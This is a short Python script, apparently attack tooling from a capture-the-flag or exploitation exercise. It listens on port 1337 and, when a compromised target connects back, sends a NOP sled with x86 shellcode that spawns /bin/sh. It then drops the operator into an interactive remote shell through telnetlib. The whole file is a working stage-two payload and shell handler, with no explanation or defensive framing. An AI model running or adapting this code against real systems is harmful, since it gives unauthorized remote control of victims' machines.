from socket import *
import telnetlib

s = socket()
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 1337))
s.listen(10)
c = s.accept()[0]
print ('new conn')
stage2 = '\x90'*64 
stage2 += '1\xdbj)X\xcd\x801\xdbj)X\xcd\x80jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
c.send(stage2)
t = telnetlib.Telnet()
t.sock = c
t.interact()
c.close()

